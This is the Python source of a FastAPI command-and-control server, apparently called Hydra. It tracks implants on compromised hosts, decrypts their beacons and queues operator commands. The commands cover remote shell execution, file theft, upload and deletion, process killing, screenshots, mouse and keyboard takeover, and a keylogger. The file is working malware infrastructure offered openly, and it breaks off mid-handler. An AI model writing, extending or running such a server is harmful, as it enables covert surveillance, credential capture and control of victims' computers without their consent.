import os
import ssl
import json
import time
import base64
import logging
import secrets
from typing import Dict, Any, List, Optional
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Request, status, Form
from starlette.websockets import WebSocketState
from fastapi.responses import JSONResponse, HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel
import asyncio
import uvicorn
from jose import JWTError, jwt
from sqlalchemy.orm import sessionmaker, Session
from server import auth
from server import models

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class C2Server:
    def __init__(self, db_path: str, psk: str):
        self.db_path = db_path
        self.psk = psk
        self.implant_keys = {}
        self.pending_commands = {}
        self.responses = {}
        self.dashboard_connections = set()
        self.engine = models.init_db()
        self.Session = sessionmaker(bind=self.engine)
        self.start_time = time.time()  # Track when the server started
        logging.info("C2Server initialized")
        
    def _init_db(self) -> None:
        """Initialize database tables"""
        models.Base.metadata.create_all(self.engine)
        
    def _get_implant_key(self, implant_id: str) -> bytes:
        """Get or generate encryption key for implant"""
        if implant_id not in self.implant_keys:
            # Derive key using implant ID as salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=implant_id.encode(),
                iterations=100000
            )
            
            key = base64.urlsafe_b64encode(
                kdf.derive(self.psk.encode())
            )
            
            self.implant_keys[implant_id] = Fernet(key)
            
        return self.implant_keys[implant_id]
        
    def _decrypt_data(
        self,
        implant_id: str,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Decrypt data from implant"""
        fernet = self._get_implant_key(implant_id)
        encrypted = base64.urlsafe_b64decode(
            encrypted_data
        )
        decrypted = fernet.decrypt(encrypted)
        return json.loads(decrypted)
        
    def _encrypt_data(
        self,
        implant_id: str,
        data: Dict[str, Any]
    ) -> str:
        """Encrypt data for implant"""
        fernet = self._get_implant_key(implant_id)
        json_data = json.dumps(data)
        encrypted = fernet.encrypt(
            json_data.encode()
        )
        return base64.urlsafe_b64encode(
            encrypted
        ).decode()
        
    def get_active_implants(self) -> List[Dict[str, Any]]:
        """Get list of active implants"""
        session = self.Session()
        try:
            five_mins_ago = datetime.utcnow() - timedelta(minutes=5)
            implants = session.query(models.Implant).filter(
                models.Implant.last_seen > five_mins_ago
            ).all()
            
            return [{
                "id": implant.id,
                "hostname": implant.hostname,
                "last_seen": implant.last_seen.isoformat(),
                "os": implant.os_info,
                "ip": implant.ip_address or "unknown",
                "status": "online"
            } for implant in implants]
        finally:
            session.close()

    async def broadcast_implants(self):
        """Broadcast active implants to all dashboard connections"""
        implants = self.get_active_implants()
        message = {
            "type": "implants",
            "implants": implants
        }
        
        dead_connections = set()
        for ws in self.dashboard_connections:
            try:
                await ws.send_json(message)
            except Exception as e:
                logging.error(f"Failed to send to dashboard: {e}")
                dead_connections.add(ws)
        
        # Clean up dead connections
        self.dashboard_connections -= dead_connections

    def handle_beacon(
        self,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Handle beacon from implant"""
        try:
            # Extract implant ID from encrypted data
            data = json.loads(
                base64.urlsafe_b64decode(
                    encrypted_data
                ).decode()
            )
            implant_id = data.get("id")
            
            if not implant_id:
                return {"error": "Invalid beacon"}
                
            # Decrypt full beacon data
            beacon_data = self._decrypt_data(
                implant_id,
                encrypted_data
            )
            
            # Update implant record
            session = self.Session()
            try:
                # Check if implant exists
                implant = session.query(models.Implant).filter(models.Implant.id == implant_id).first()
                
                if not implant:
                    # New implant
                    new_implant = models.Implant(
                        id=implant_id,
                        first_seen=datetime.now(),
                        last_seen=datetime.now(),
                        hostname=beacon_data.get("hostname", "unknown"),
                        os_info=beacon_data.get("os_info", "unknown"),
                        ip_address=beacon_data.get("ip", "unknown")
                    )
                    session.add(new_implant)
                else:
                    # Update last seen and info
                    implant.last_seen = datetime.now()
                    implant.hostname = beacon_data.get("hostname", "unknown")
                    implant.os_info = beacon_data.get("os_info", "unknown")
                    implant.ip_address = beacon_data.get("ip", "unknown")
                
                session.commit()
            finally:
                session.close()
            
            # Broadcast implant update to dashboard
            asyncio.create_task(self.broadcast_implants())
                
            # Check for pending commands
            response = {
                "status": "ok"
            }
            
            if implant_id in self.pending_commands:
                cmd = self.pending_commands[implant_id]
                del self.pending_commands[implant_id]
                response.update(cmd)
                
            return self._encrypt_data(
                implant_id,
                response
            )
            
        except Exception as e:
            logging.error(f"Error handling beacon: {e}")
            return {"error": str(e)}
            
    def handle_response(
        self,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Handle command response from implant"""
        try:
            # Extract implant ID
            data = json.loads(
                base64.urlsafe_b64decode(
                    encrypted_data
                ).decode()
            )
            implant_id = data.get("id")
            
            if not implant_id:
                return {"error": "Invalid response"}
                
            # Decrypt response data
            resp_data = self._decrypt_data(
                implant_id,
                encrypted_data
            )
            
            # Check if this is a screenshot with request_id (from HTTP fallback)
            request_id = resp_data.get("request_id", None)
            if request_id and resp_data["type"] == "screenshot":
                logging.info(f"Received screenshot response with request_id {request_id} from implant {implant_id}")
                
                # Check if we have a pending request with this ID
                if request_id in self.responses and self.responses[request_id].get("pending", False):
                    logging.info(f"Found matching pending request {request_id} for this screenshot response")
                    
                    # Update the pending request with the screenshot data
                    self.responses[request_id] = {
                        "implant_id": implant_id,
                        "type": "screenshot",
                        "image_data": resp_data["data"]["image_data"],
                        "format": resp_data["data"].get("format", "jpeg"),
                        "width": resp_data["data"].get("width"),
                        "height": resp_data["data"].get("height"),
                        "timestamp": time.time(),
                        "pending": False
                    }
                    logging.info(f"Updated response with request_id {request_id} for pending request")
            
            # Update command status based on response type
            session = self.Session()
            try:
                # Find the implant in db
                implant = session.query(models.Implant).filter(
                    models.Implant.id == implant_id
                ).first()
                
                if implant:
                    # Update last_seen
                    implant.last_seen = datetime.utcnow()
                    session.commit()
                    
                # Process specific response types
                if resp_data["type"] == "shell_output":
                    command = session.query(models.Command).filter(
                        models.Command.implant_id == implant_id,
                        models.Command.status == "pending"
                    ).first()
                    
                    if command:
                        command.status = "completed"
                        command.output = resp_data["data"]["output"]
                        session.commit()
                        
                        # Broadcast command output to dashboard
                        asyncio.create_task(self._broadcast_command_output(
                            implant_id,
                            resp_data["data"]["output"]
                        ))
                        
                elif resp_data["type"] in ["file_data", "upload_status"]:
                    file = session.query(models.File).filter(
                        models.File.implant_id == implant_id,
                        models.File.status == "pending"
                    ).first()
                    
                    if file:
                        file.status = "completed"
                        session.commit()
                        
                        # Broadcast file data to dashboard
                        if resp_data["type"] == "file_data" and "content" in resp_data["data"]:
                            asyncio.create_task(self._broadcast_file_data(
                                implant_id,
                                file.filename,
                                resp_data["data"]["content"]
                            ))
                            
                elif resp_data["type"] == "process_list" and "data" in resp_data:
                    # Broadcast process list to dashboard
                    asyncio.create_task(self._broadcast_process_list(
                        implant_id,
                        resp_data["data"]
                    ))
                    
                elif resp_data["type"] == "process_info" and "data" in resp_data:
                    # Broadcast process info to dashboard
                    asyncio.create_task(self._broadcast_process_info(
                        implant_id,
                        resp_data["data"]
                    ))
                    
                elif resp_data["type"] == "process_kill" and "data" in resp_data:
                    # Broadcast process kill result to dashboard
                    asyncio.create_task(self._broadcast_process_kill(
                        implant_id,
                        resp_data["data"]
                    ))
                    
                elif resp_data["type"] == "screenshot" and "data" in resp_data:
                    # Check if image data exists
                    if "image_data" in resp_data["data"]:
                        logging.info(f"Received screenshot response from implant {implant_id}")
                        image_data = resp_data["data"]["image_data"]
                        img_format = resp_data["data"].get("format", "jpeg")
                        width = resp_data["data"].get("width") # Optional
                        height = resp_data["data"].get("height") # Optional

                        # Broadcast screenshot to WebSocket dashboard
                        asyncio.create_task(self._broadcast_screenshot(
                            implant_id,
                            image_data,
                            img_format
                        ))
                        
                        # If this has a request_id from HTTP fallback, use that as the response key
                        response_id = request_id if request_id else secrets.token_hex(8)
                        
                        # Store the response for the HTTP fallback mechanism
                        self.responses[response_id] = {
                            "implant_id": implant_id,
                            "type": "screenshot",
                            "image_data": image_data,
                            "format": img_format,
                            "width": width,
                            "height": height,
                            "timestamp": time.time() # Record when received
                        }
                        logging.info(f"Stored screenshot in responses with ID {response_id} for implant {implant_id}")
                        logging.info(f"Current responses count: {len(self.responses)}")
                    else:
                        logging.error(f"Screenshot response missing image_data for implant {implant_id}")

                # Special handling for beacons with embedded screenshot responses
                elif resp_data["type"] == "beacon" and "screenshot" in resp_data:
                    logging.info(f"Received beacon with embedded screenshot from implant {implant_id}")
                    screenshot_data = resp_data["screenshot"]
                    
                    if "image_data" in screenshot_data:
                        image_data = screenshot_data["image_data"]
                        img_format = screenshot_data.get("format", "jpeg")
                        width = screenshot_data.get("width")
                        height = screenshot_data.get("height")
                        
                        # Broadcast screenshot to WebSocket dashboard
                        asyncio.create_task(self._broadcast_screenshot(
                            implant_id,
                            image_data,
                            img_format
                        ))
                        
                        # Store for HTTP fallback - use request_id if available
                        response_id = screenshot_data.get("request_id", secrets.token_hex(8))
                        self.responses[response_id] = {
                            "implant_id": implant_id,
                            "type": "screenshot",
                            "image_data": image_data,
                            "format": img_format,
                            "width": width,
                            "height": height,
                            "timestamp": time.time()
                        }
                        logging.info(f"Stored embedded screenshot in responses with ID {response_id}")
                    
            finally:
                session.close()
                    
            return {"status": "ok"}
            
        except Exception as e:
            logging.error(
                f"Error handling response: {str(e)}"
            )
            return {"error": "Server error"}
    
    async def _broadcast_command_output(self, implant_id: str, output: str):
        """Broadcast command output to dashboard"""
        message = {
            "type": "command_output",
            "implant_id": implant_id,
            "output": output
        }
        
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_file_data(self, implant_id: str, filename: str, content: str):
        """Broadcast file data to dashboard"""
        message = {
            "type": "file_download",
            "implant_id": implant_id,
            "filename": filename,
            "content": content
        }
        
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_process_list(self, implant_id: str, processes: list):
        """Broadcast process list to dashboard"""
        message = {
            "type": "process_list",
            "implant_id": implant_id,
            "processes": processes
        }
        
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_process_info(self, implant_id: str, process_info: dict):
        """Broadcast process info to dashboard"""
        message = {
            "type": "process_info",
            "implant_id": implant_id,
            "process_info": process_info
        }
        
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_process_kill(self, implant_id: str, result: dict):
        """Broadcast process kill result to dashboard"""
        message = {
            "type": "process_killed",
            "implant_id": implant_id,
            "pid": result.get("pid", 0),
            "success": result.get("success", False),
            "error": result.get("error", "")
        }
        
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_screenshot(self, implant_id: str, image_data: str, format: str):
        """Broadcast screenshot to all dashboard connections"""
        message = {
            "type": "screenshot",
            "data": {
                "implant_id": implant_id,
                "image_data": image_data,
                "format": format,
                "timestamp": datetime.utcnow().isoformat()
            }
        }
        await self._broadcast_to_dashboard(message)
    
    async def _broadcast_to_dashboard(self, message: dict):
        """Broadcast message to all dashboard connections"""
        dead_connections = set()
        for ws in self.dashboard_connections:
            try:
                await ws.send_json(message)
            except Exception as e:
                logging.error(f"Failed to send to dashboard: {e}")
                dead_connections.add(ws)
        
        # Clean up dead connections
        self.dashboard_connections -= dead_connections

    def queue_command(
        self,
        implant_id: str,
        command: str,
        args: list
    ) -> bool:
        """Queue command for implant"""
        try:
            session = self.Session()
            try:
                # Check if implant exists
                implant = session.query(models.Implant).filter(models.Implant.id == implant_id).first()
                
                if not implant:
                    return False
                    
                # Add command to queue
                new_command = models.Command(
                    implant_id=implant_id,
                    command=command,
                    args=json.dumps(args),
                    timestamp=datetime.now(),
                    status="pending"
                )
                session.add(new_command)
                
                session.commit()
                
            finally:
                session.close()
            
            # Add to pending commands
            self.pending_commands[implant_id] = {
                "command": command,
                "args": args
            }
            
            return True
            
        except Exception as e:
            logging.error(
                f"Error queueing command: {str(e)}"
            )
            return False

# Initialize FastAPI app
app = FastAPI()
app.mount("/static", StaticFiles(directory="server/static"), name="static")
templates = Jinja2Templates(directory="server/templates")

# Create a consistent session factory function
def get_db_session():
    """Get a database session with proper engine binding"""
    if hasattr(c2_server, 'Session'):
        return c2_server.Session()
    else:
        # Use a default session if c2_server isn't initialized
        from sqlalchemy.orm import sessionmaker
        engine = models.init_db()
        SessionLocal = sessionmaker(bind=engine)
        return SessionLocal()

# Add middleware for API authentication
@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    if request.url.path == "/login" or request.url.path == "/token" or request.url.path.startswith("/static"):
        return await call_next(request)
    
    # Check if this is a root request with a token in localStorage
    if request.url.path == "/":
        return templates.TemplateResponse("dashboard.html", {"request": request})
        
    # Continue with normal request processing
    response = await call_next(request)
    return response

# Initialize C2 server
c2_server = C2Server("hydra.db", os.getenv("HYDRA_PSK", "development_key"))

# Store connected clients and their WebSocket connections
clients: Dict[str, dict] = {}
client_websockets: Dict[str, WebSocket] = {}

# OAuth2 scheme for token authentication
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# Models
class Command(BaseModel):
    args: List[str]

class CommandRequest(BaseModel):
    client_id: str
    command: Command

class ClientInfo(BaseModel):
    id: str
    hostname: str
    ip: str
    os: str
    status: str
    last_seen: float

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

# Routes
@app.get("/")
async def root(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/login")
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(auth.get_db)):
    user = auth.authenticate_user(form_data.username, form_data.password, db)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Update last login
    user.last_login = datetime.utcnow()
    db.commit()
    
    access_token = auth.create_access_token(
        data={"sub": user.username},
        expires_delta=timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/api/clients")
async def get_clients(current_user: models.User = Depends(auth.get_current_user)):
    return c2_server.get_active_implants()

@app.get("/api/clients/{client_id}/details")
async def get_client_details(client_id: str, token: str = Depends(oauth2_scheme)):
    if client_id not in clients:
        raise HTTPException(status_code=404, detail="Client not found")
    return clients[client_id]

@app.post("/api/command")
async def send_command(command_req: CommandRequest, token: str = Depends(oauth2_scheme)):
    if command_req.client_id not in client_websockets:
        raise HTTPException(status_code=404, detail="Client not connected")
    
    try:
        ws = client_websockets[command_req.client_id]
        await ws.send_json({
            "type": "command",
            "command": command_req.command.dict()
        })
        return {"status": "success", "message": "Command sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.websocket("/c2")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    logging.info("New client connected")
    client_id = None  # Track the client ID for better error handling
    
    try:
        while True:
            try:
                data = await websocket.receive_json()
                message_type = data.get('type', 'unknown')
                client_id = data.get('client_id', client_id)  # Update tracking
                
                logging.info(f"Received data type: {message_type} from client: {client_id}")
                
                # Special handling for screenshot data
                if message_type == "screenshot" and "data" in data and "image_data" in data["data"]:
                    request_id = data.get("request_id", None)
                    logging.info(f"Received screenshot from client {client_id} via WebSocket" + 
                                (f" with request_id {request_id}" if request_id else ""))
                    
                    # If we have a request_id, use it as the key for storing the response
                    response_id = request_id if request_id else secrets.token_hex(8)
                    
                    # Store in responses for HTTP fallback 
                    c2_server.responses[response_id] = {
                        "implant_id": client_id,
                        "type": "screenshot",
                        "image_data": data["data"]["image_data"],
                        "format": data["data"].get("format", "jpeg"),
                        "width": data["data"].get("width", 1920),
                        "height": data["data"].get("height", 1080),
                        "timestamp": time.time()
                    }
                    logging.info(f"Stored WebSocket screenshot in responses with ID {response_id}")
                    
                    # Also broadcast to dashboard
                    try:
                        asyncio.create_task(c2_server._broadcast_screenshot(
                            client_id,
                            data["data"]["image_data"],
                            data["data"].get("format", "jpeg")
                        ))
                        logging.info(f"Broadcasting screenshot to dashboard connections")
                    except Exception as e:
                        logging.error(f"Error broadcasting screenshot: {str(e)}")
                    
                    # Send acknowledgment
                    await websocket.send_json({
                        "type": "screenshot_ack",
                        "status": "success",
                        "request_id": request_id
                    })
                    logging.info(f"Sent screenshot acknowledgment to client {client_id}")
                    continue  # Skip the rest of the handler
                
                if message_type == "register":
                    clients[client_id] = {
                        "id": client_id,
                        "hostname": data.get("hostname", "unknown"),
                        "ip": data.get("ip", "unknown"),
                        "os": data.get("os", "unknown"),
                        "last_seen": datetime.now().timestamp()
                    }
                    client_websockets[client_id] = websocket
                    logging.info(f"Client registered: {client_id}")
                    
                    # Create/update the implant in the database
                    session = c2_server.Session()
                    try:
                        # Check if implant exists
                        implant = session.query(models.Implant).filter(models.Implant.id == client_id).first()
                        
                        if not implant:
                            # New implant
                            new_implant = models.Implant(
                                id=client_id,
                                first_seen=datetime.now(),
                                last_seen=datetime.now(),
                                hostname=data.get("hostname", "unknown"),
                                os_info=data.get("os", "unknown"),
                                ip_address=data.get("ip", "unknown")
                            )
                            session.add(new_implant)
                        else:
                            # Update last seen and info
                            implant.last_seen = datetime.now()
                            implant.hostname = data.get("hostname", "unknown")
                            implant.os_info = data.get("os", "unknown")
                            implant.ip_address = data.get("ip", "unknown")
                        
                        session.commit()
                    finally:
                        session.close()
                    
                    # Broadcast update
                    await manager.broadcast({"type": "client_update"})
                    
                    # Send acknowledgment
                    await websocket.send_json({
                        "type": "register_ack",
                        "status": "success"
                    })
                
                elif message_type == "beacon":
                    if client_id in clients:
                        clients[client_id]["last_seen"] = datetime.now().timestamp()
                        logging.info(f"Beacon from {client_id}")
                        
                        # Update the implant in the database
                        session = c2_server.Session()
                        try:
                            implant = session.query(models.Implant).filter(models.Implant.id == client_id).first()
                            if implant:
                                implant.last_seen = datetime.now()
                                session.commit()
                        finally:
                            session.close()
                        
                        await websocket.send_json({
                            "type": "beacon_ack",
                            "status": "success"
                        })
                
                elif message_type == "command_output":
                    await manager.broadcast({
                        "type": "command_output",
                        "client_id": data["client_id"],
                        "output": data["output"]
                    })
                    
            except json.JSONDecodeError:
                logging.error("Invalid JSON received")
                continue
    
    except WebSocketDisconnect:
        logging.info("Client disconnected")
        manager.disconnect(websocket)
        for client_id, ws in list(client_websockets.items()):
            if ws == websocket:
                del client_websockets[client_id]
                logging.info(f"Removed client: {client_id}")
                await manager.broadcast({"type": "client_update"})
                break
    except Exception as e:
        logging.error(f"WebSocket error: {str(e)}")
        manager.disconnect(websocket)

# Server-side heartbeat function to ensure connection stays alive
async def send_heartbeat(websocket: WebSocket, username: str):
    """Send regular heartbeats to keep the WebSocket connection alive"""
    try:
        # Send heartbeat every 20 seconds
        while True:
            try:
                await asyncio.sleep(20)
                if websocket.client_state == WebSocketState.CONNECTED:
                    await websocket.send_json({
                        "type": "heartbeat",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    logging.debug(f"Sent heartbeat to {username}")
                else:
                    logging.warning(f"Websocket for {username} disconnected, stopping heartbeat")
                    break
            except Exception as e:
                logging.error(f"Error sending heartbeat to {username}: {str(e)}")
                break
    except asyncio.CancelledError:
        # Task was cancelled, clean up
        logging.info(f"Heartbeat task for {username} cancelled")
    except Exception as e:
        logging.error(f"Unexpected error in heartbeat task for {username}: {str(e)}")

@app.websocket("/ws/dashboard")
async def dashboard_websocket(websocket: WebSocket):
    # Only accept the connection once, and do it after validating the token
    heartbeat_task = None
    try:
        # Get token from query parameters first before accepting connection
        token = websocket.query_params.get("token")
        logging.info(f"WebSocket connection attempt with token: {token[:10] if token else None}...")
        
        if not token:
            logging.error("WebSocket connection rejected: No token provided")
            await websocket.accept() # Need to accept before sending close
            await websocket.close(code=4003, reason="No authentication token provided")
            return
            
        # Validate token
        try:
            logging.info(f"Validating JWT token...")
            payload = jwt.decode(token, auth.SECRET_KEY, algorithms=[auth.ALGORITHM])
            username: str = payload.get("sub")
            if username is None:
                logging.error("WebSocket connection rejected: Token payload missing 'sub' claim")
                await websocket.accept() # Need to accept before sending close
                await websocket.close(code=4003, reason="Invalid token")
                return
            logging.info(f"Successfully validated token for user: {username}")
        except JWTError as e:
            logging.error(f"WebSocket connection rejected: JWT validation error: {str(e)}")
            await websocket.accept() # Need to accept before sending close
            await websocket.close(code=4003, reason="Invalid token")
            return
            
        # Now accept the WebSocket connection
        await websocket.accept()
        c2_server.dashboard_connections.add(websocket)
        logging.info(f"Dashboard client connected: {username}")
        
        # Send initial implant list
        implants = c2_server.get_active_implants()
        await websocket.send_json({
            "type": "implants",
            "implants": implants
        })
        
        # Start a background task for sending heartbeats
        heartbeat_task = asyncio.create_task(send_heartbeat(websocket, username))
        
        while True:
            try:
                # Use a timeout to detect if connection is lost
                data = await asyncio.wait_for(
                    websocket.receive_json(),
                    timeout=60  # 60 second timeout to detect dead connections
                )
                logging.info(f"Dashboard command received from {username}: {data}")
            
                # Handle ping messages for keeping connection alive
                if data["type"] == "ping":
                    # Send back a pong immediately
                    await websocket.send_json({
                        "type": "pong",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                # Handle pong responses from client
                elif data["type"] == "pong":
                    # Just log it for debugging and update last seen timestamp
                    logging.debug(f"Received pong from {username} at {data.get('timestamp', 'unknown')}")
                        
                elif data["type"] == "get_implants":
                    implants = c2_server.get_active_implants()
                    await websocket.send_json({
                        "type": "implants",
                        "implants": implants
                    })
                elif data["type"] == "send_command":
                    if "implant_id" not in data or "command" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid command format"
                        })
                        continue
                    
                    # Queue command for implant
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "command",
                        "command": data["command"]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Command queued for execution"
                    })
                
                elif data["type"] == "get_files":
                    if "implant_id" not in data or "path" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid file request format"
                        })
                        continue
                    
                    # Queue file listing command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "list_files",
                        "path": data["path"]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "File listing request sent"
                    })
                
                elif data["type"] == "download_file":
                    if "implant_id" not in data or "path" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid file download request"
                        })
                        continue
                    
                    # Queue file download command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "download",
                        "args": [data["path"]]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "File download request sent"
                    })
                
                elif data["type"] == "upload_file":
                    if "implant_id" not in data or "path" not in data or "content" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid file upload request"
                        })
                        continue
                    
                    # Queue file upload command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "upload",
                        "args": [data["path"], data["content"]]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "File upload request sent"
                    })
                
                elif data["type"] == "delete_file":
                    if "implant_id" not in data or "path" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid file delete request"
                        })
                        continue
                    
                    # Queue file delete command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "delete_file",
                        "args": [data["path"]]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "File delete request sent"
                    })
                
                elif data["type"] == "get_processes":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid process request format"
                        })
                        continue
                    
                    # Queue process listing command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "process",
                        "args": ["list"]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Process listing request sent"
                    })
                
                elif data["type"] == "get_process_details":
                    if "implant_id" not in data or "pid" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid process details request"
                        })
                        continue
                    
                    # Queue process details command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "process",
                        "args": ["info", str(data["pid"])]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Process details request sent"
                    })
                
                elif data["type"] == "kill_process":
                    if "implant_id" not in data or "pid" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid kill process request format"
                        })
                        continue
                    
                    # Queue kill process command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "process",
                        "args": ["kill", str(data["pid"])]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Process kill request sent"
                    })
                
                elif data["type"] == "capture_screen":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid screen capture request"
                        })
                        continue
                    
                    # Generate a unique request ID for this screenshot request
                    request_id = secrets.token_hex(8)
                    
                    # Queue screenshot command with request ID for better tracking
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": "screenshot",  # Changed from type to command
                        "request_id": request_id
                    }
                    
                    # Add debug logging
                    logging.info(f"Queued screenshot command for implant {data['implant_id']} with request_id {request_id}")
                    logging.info(f"Current pending commands: {c2_server.pending_commands}")
                    
                    # Create placeholder for this request
                    c2_server.responses[request_id] = {
                        "pending": True,
                        "implant_id": data["implant_id"],
                        "type": "screenshot_request",
                        "timestamp": time.time()
                    }
                    
                    # Acknowledge the request
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Screen capture request sent"
                    })
                
                elif data["type"] == "set_scale_factor":
                    # Set scale factor for remote control
                    if "implant_id" not in data or "scale_factor" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid scale factor command format"
                        })
                        continue
                    
                    # Queue scale factor command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": "set_scale_factor",
                        "scale_factor": data.get("scale_factor", 0.5)
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Scale factor set"
                    })
                
                elif data["type"] == "control":
                    # Handle remote control commands (mouse/keyboard)
                    if "implant_id" not in data or "command" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid remote control command format"
                        })
                        continue
                    
                    # Create command structure for implant
                    control_command = {
                        "command": data["command"]
                    }
                    
                    # Add relevant parameters based on command type
                    if data["command"] in ["mouse_move", "mouse_click", "mouse_down", "mouse_up"]:
                        control_command["x"] = data.get("x", 0)
                        control_command["y"] = data.get("y", 0)
                        if "button" in data:
                            control_command["button"] = data["button"]
                    
                    elif data["command"] in ["key_press", "key_down", "key_up"]:
                        if "key_data" in data:
                            control_command["key"] = data["key_data"].get("key", "")
                        else:
                            control_command["key"] = data.get("key", "")
                    
                    # Queue control command
                    c2_server.pending_commands[data["implant_id"]] = control_command
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": f"Remote control command sent: {data['command']}"
                    })
                
                elif data["type"] == "command":
                    # Handle special commands like enable/disable remote control
                    if "implant_id" not in data or "command" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid command format"
                        })
                        continue
                    
                    # Queue command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": data["command"]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success", 
                        "message": f"Command sent: {data['command']}"
                    })
                
                elif data["type"] == "start_keylogger":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid keylogger command"
                        })
                        continue
                    
                    # Queue keylogger command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": "start_keylogger"
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Keylogger start command sent"
                    })
                
                elif data["type"] == "stop_keylogger":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid keylogger command"
                        })
                        continue
                    
                    # Queue keylogger command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": "stop_keylogger"
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Keylogger stop command sent"
                    })
                
                elif data["type"] == "get_keylog_data":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid keylogger command"
                        })
                        continue
                    
                    # Queue keylogger command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "command": "get_keylog_data"
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Keylogger data request sent"
                    })
                
                elif data["type"] == "get_system_info":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert", 
                            "alert_type": "error",
                            "message": "Invalid system info request"
                        })
                        continue
                    
                    # Queue system info command
